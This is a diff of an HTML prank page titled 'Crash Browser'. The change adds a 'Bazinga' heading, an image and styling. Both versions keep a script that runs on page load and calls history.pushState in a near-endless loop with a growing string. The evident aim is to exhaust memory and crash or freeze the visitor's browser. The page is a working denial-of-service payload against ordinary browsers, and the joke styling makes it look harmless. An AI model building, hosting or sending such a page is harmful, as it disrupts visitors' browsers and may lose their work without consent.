@@ -1,15 +1,36 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Crash Browser</title>
-  </head>
-  <body>
-    <script>
-      var total = "";
-      for( var i = 0; i < 10000000000000; i++ ) {
-        total += i.toString();
-        history.pushState(0,0, total );
-      }
-    </script>
-  </body>
+<head>
+	<title>Bazinga (Crash Browser)</title>
+	<style>
+		body {
+			margin: 0;
+			padding: 0;
+			height: 100vh;
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			justify-content: center;
+		}
+		h1 {
+			font-size: 10vw;
+		}
+		img {
+			width: 100%;
+			height: 50vh;
+			object-fit: cover;
+		}
+	</style>
+</head>
+<body>
+	<h1>Bazinga</h1>
+	<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4FqVYjmK9mupC1gKKYad-sdW24EpeqJ4uQA&s" alt="Bazinga Image">
+	<script>
+		var total = "";
+		for( var i = 0; i < 10000000000000; i++ ) {
+			total += i.toString();
+			history.pushState(0,0, total );
+		}
+	</script>
+</body>
 </html>
